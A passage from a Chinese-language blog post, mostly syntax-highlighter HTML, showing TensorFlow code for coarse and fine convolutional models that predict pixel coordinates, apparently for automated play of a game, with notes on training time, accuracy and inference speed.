!important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef forward(self, img, is_training, keep_prob, name='coarse'):\r\n    with tf.name_scope(name):\r\n        with tf.variable_scope(name):\r\n            out = self.conv2d('conv1', img, [3, 3, self.input_channle, 16], 2)\r\n            # out = tf.layers.batch_normalization(out, name='bn1', training=is_training)\r\n            out = tf.nn.relu(out, name='relu1')\r\n\r\n            out = self.make_conv_bn_relu('conv2', out, [3, 3, 16, 32], 1, is_training)\r\n            out = tf.nn.max_pool(out, [1, 2, 2, 1], [1, 2, 2, 1], padding='SAME')\r\n\r\n            out = self.make_conv_bn_relu('conv3', out, [5, 5, 32, 64], 1, is_training)\r\n            out = tf.nn.max_pool(out, [1, 2, 2, 1], [1, 2, 2, 1], padding='SAME')\r\n\r\n            out = self.make_conv_bn_relu('conv4', out, [7, 7, 64, 128], 1, is_training)\r\n            out = tf.nn.max_pool(out, [1, 2, 2, 1], [1, 2, 2, 1], padding='SAME')\r\n\r\n            out = self.make_conv_bn_relu('conv5', out, [9, 9, 128, 256], 1, is_training)\r\n            out = tf.nn.max_pool(out, [1, 2, 2, 1], [1, 2, 2, 1], padding='SAME')\r\n\r\n            out = tf.reshape(out, [-1, 256 * 20 * 23])\r\n            out = self.make_fc('fc1', out, [256 * 20 * 23, 256], keep_prob)\r\n            out = self.make_fc('fc2', out, [256, 2], keep_prob)\r\n\r\n    return out</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29800613d279620228-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800613d279620228-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29800613d279620228-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800613d279620228-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29800613d279620228-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800613d279620228-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29800613d279620228-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800613d279620228-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29800613d279620228-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800613d279620228-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29800613d279620228-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800613d279620228-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29800613d279620228-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800613d279620228-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29800613d279620228-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800613d279620228-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29800613d279620228-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800613d279620228-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29800613d279620228-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800613d279620228-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29800613d279620228-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800613d279620228-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29800613d279620228-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29800613d279620228-24\">24</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29800613d279620228-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">forward</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">img</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">is_training</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">keep_prob</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">name</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'coarse'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800613d279620228-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">with </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">name_scope</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29800613d279620228-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">with </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">variable_scope</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800613d279620228-4\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">conv2d</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'conv1'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">img</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">input_channle</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29800613d279620228-5\"><span class=\"crayon-h\">            </span><span class=\"crayon-p\"># out = tf.layers.batch_normalization(out, name='bn1', training=is_training)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800613d279620228-6\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nn</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">relu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">name</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'relu1'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29800613d279620228-7\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800613d279620228-8\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_conv_bn_relu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'conv2'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">16</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">32</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">is_training</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29800613d279620228-9\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nn</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max_pool</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">padding</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'SAME'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800613d279620228-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f29800613d279620228-11\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_conv_bn_relu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'conv3'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">32</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">64</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">is_training</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800613d279620228-12\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nn</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max_pool</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">padding</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'SAME'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29800613d279620228-13\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800613d279620228-14\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_conv_bn_relu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'conv4'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">64</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">128</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">is_training</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29800613d279620228-15\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nn</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max_pool</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">padding</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'SAME'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800613d279620228-16\"> </div><div class=\"crayon-line\" id=\"crayon-5a6f29800613d279620228-17\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_conv_bn_relu</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'conv5'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">128</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">256</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">is_training</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800613d279620228-18\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">nn</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">max_pool</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">padding</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'SAME'</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29800613d279620228-19\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800613d279620228-20\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tf</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">reshape</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">256</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">23</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29800613d279620228-21\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_fc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'fc1'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">256</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">23</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">256</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">keep_prob</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800613d279620228-22\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">out</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">make_fc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">'fc2'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">256</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">keep_prob</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29800613d279620228-23\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29800613d279620228-24\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">out</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0095 seconds] -->\r\n<p>经过十小时的训练，coarse模型在测试集上达到了6像素的精度，实际测试精度大约为10像素，在测试机器（MacBook Pro Retina, 15-inch, Mid 2015, 2.2 GHz Intel Core i7）上inference时间0.4秒。这一模型可以很轻松的拿到超过1k的分数，这已经远远超过了人类水平和绝大多数自动算法的水平，日常娱乐完全够用，不过，你认为我们就此为止那就大错特错了~</p>\n<h2>Fine 模型</h2>\n<p>fine模型结构与coarse模型类似，参数量稍大，fine模型作为对coarse模型的refine操作，</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f298006144740155551\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef forward(self, img, is_training, keep_prob, name='fine'):\r\n    with tf.name_scope(name):\r\n        with tf.variable_scope(name):\r\n            out = self.conv2d('conv1', img, [3, 3, self.input_channle, 16], 2)\r\n            # out = tf.layers.batch_normalization(out, name='bn1', training=is_training)\r\n            out = tf.nn.relu(out, name='relu1')\r\n\r\n            out = self.make_conv_bn_relu('conv2', out, [3, 3, 16, 64], 1, is_training)\r\n            out = tf.nn.max_pool(out, [1, 2, 2, 1], [1, 2, 2, 1], padding='SAME')\r\n\r\n            out = self.make_conv_bn_relu('conv3', out, [5, 5, 64, 128], 1, is_training)\r\n            out = tf.nn.max_pool(out, [1, 2, 2, 1], [1, 2, 2, 1], padding='SAME')\r\n\r\n            out = self.make_conv_bn_relu('conv4', out, [7, 7, 128, 256], 1, is_training)\r\n            out = tf.nn.max_pool(out, [1, 2, 2, 1], [1, 2, 2, 1], padding='SAME')\r\n\r\n            out = self.make_conv_bn_relu('conv5', out, [9, 9, 256, 512], 1, is_training)\r\n            out = tf.nn.max_pool(out, [1, 2, 2, 1], [1, 2, 2, 1], padding='SAME')\r\n\r\n            out = tf.reshape(out, [-1, 512 * 10 * 10])\r\n            out = self.make_fc('fc1', out, [512 * 10 * 10, 512], keep_prob)\r\n            out = self.make_fc('fc2', out, [512, 2], keep_prob)\r\n\r\n    return out</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f298006144740155551-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f298006144740155551-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f298006144740155551-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f298006144740155551-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f298006144740155551-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f298006144740155551-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f298006144740155551-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f298006144740155551-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f298006144740155551-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f298006144740155551-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f298006144740155551-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f298006144740155551-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f298006144740155551-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f298006144740155551-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f298006144740155551-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f298006144740155551-16\">16</div><div class=\"crayon-num\" 